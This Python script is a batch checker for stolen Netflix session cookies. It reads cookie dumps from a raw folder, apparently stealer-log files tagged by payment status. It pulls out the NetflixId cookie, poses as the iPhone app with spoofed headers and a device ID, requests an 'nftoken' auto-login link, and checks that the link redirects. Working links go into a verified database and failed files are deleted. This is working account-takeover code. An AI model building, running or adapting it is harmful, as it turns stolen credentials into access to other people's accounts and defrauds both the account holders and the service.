import json
import os
import re
import urllib.parse
from datetime import datetime
import requests
from urllib3.exceptions import InsecureRequestWarning

# --- Configuration ---
DB1_FOLDER = "DB1_Raw"
DB2_FILE = "DB2_Verified.json"

# --- Database Helper Functions ---
def load_db2():
    if os.path.exists(DB2_FILE):
        with open(DB2_FILE, 'r', encoding='utf-8') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return []
    return []

def save_db2(data):
    with open(DB2_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)
# ==========

def check_link_redirect(generated_link):
    # --- LEAVE YOUR TWO WORDS HERE ---
    valid_word_1 = "browse"
    valid_word_2 = "unsupported"
    
    # We disguise the Python script as a standard Windows PC Google Chrome browser
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    try:
        # Visit the link and follow all redirects to the very end
        response = requests.get(generated_link, headers=headers, allow_redirects=True, timeout=10)
        final_url = response.url
        
        # Check if either of your words exists anywhere in that final URL
        if valid_word_1 in final_url or valid_word_2 in final_url:
            return True
        else:
            print(f"Failed Redirect Layer: Ended up at {final_url}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Connection error during redirect check: {e}")
        return False






# ==========================================
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def ensure_input_file(filepath):
    # 1. Safety check: Ensure the file actually exists
    if not os.path.exists(filepath):
        return None

    # 2. Open and read the specific file the master loop handed us
    with open(filepath, "r", encoding="utf-8") as file_handle:
        content = file_handle.read().strip()

    # 3. Check if the file is completely empty
    if not content:
        # We print a warning so you see it in the logs, but we return None 
        # so the master loop knows to delete this useless file.
        filename = os.path.basename(filepath)
        print(f"Warning: {filename} is completely empty.")
        return None

    # 4. If everything is good, return the raw data
    return content


def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict


def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token


def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing required cookie: NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=30,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token found in response.")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires
    


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)
# ==========================================

def ensure_input_file(filepath):
    """
    MODIFIED: This now takes the 'filepath' from the master loop 
    instead of looking for a hardcoded 'input.txt'.
    """
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return None

# --- Your Original Logic (Now a standalone processor) ---
def process_single_file(filepath, filename, db2_data):
    """
    This is your original main() function, slightly adapted to handle 
    deletions and save the working links directly into DB2.
    """
    print(f"\n--- Checking: {filename} ---")
    # --- NEW LAYER: Check for zero payments ---
    if "[0 payments]" in filename  :
        print(f"File rejected: Contains [0 payments] in the name.")
        try:
            os.remove(filepath)
            print(f"Deleted {filename} from raw folder.")
        except OSError as e:
            pass
        return
    # ------------------------------------------
    # We pass the specific filepath into your reader
    raw_cookie = ensure_input_file(filepath)
    if raw_cookie is None:
        return

    cookie_dict = extract_cookie_dict(raw_cookie)
    if not cookie_dict:
        print(f"No valid cookie found in {filename}.")
        os.remove(filepath) # <--- DELETE DEAD FILE
        print(f"Deleted {filename} from raw folder.")
        return

    try:
        token, expires = fetch_nftoken(cookie_dict)
        login_url = build_nftoken_link(token)
        print("Login URL: " + login_url)
        
        if check_link_redirect(login_url):
            # <--- SAVE TO DB2 if it passes
            new_record = {
                "source_file": filename, 
                "url": login_url,
                "generated_on": datetime.now().isoformat()
            }
            db2_data.append(new_record)
            print(f"Success! Saved to DB2 from {filename}.")
        else:
            # <--- DELETE DEAD FILE if it fails redirect
            os.remove(filepath) 
            print(f"Deleted {filename} because it failed the redirect check.")
            

    except requests.RequestException as exc:
        print("Request failed: " + str(exc))
        os.remove(filepath) # <--- DELETE FAILED FILE
        print(f"Deleted {filename} due to request failure.")
        
    except ValueError as exc:
        print("Failed: " + str(exc))
        os.remove(filepath) # <--- DELETE FAILED FILE
        print(f"Deleted {filename} due to value error.")

# --- The Master Loop (The New Engine) ---
def main():
    # 1. Check if the raw folder exists
    if not os.path.exists(DB1_FOLDER):
        print(f"Error: Please create a folder named '{DB1_FOLDER}'")
        return

    # 2. Load the current working links
    # 2. Start with a fresh, empty database every time
    db2_data = []
    
    # 3. Loop through every file in the folder
    files_processed = 0
    for filename in os.listdir(DB1_FOLDER):
        if not filename.endswith(".txt"):
            continue
            
        filepath = os.path.join(DB1_FOLDER, filename)
        
        # Feed the file into your custom logic
        process_single_file(filepath, filename, db2_data)
        files_processed += 1

    # 4. Save the updated database once the loop finishes
    if files_processed > 0:
        save_db2(db2_data)
        print("\nBatch run complete. DB2 has been updated.")
    else:
        print("\nNo .txt files found in the raw folder.")

if __name__ == "__main__":
    main()
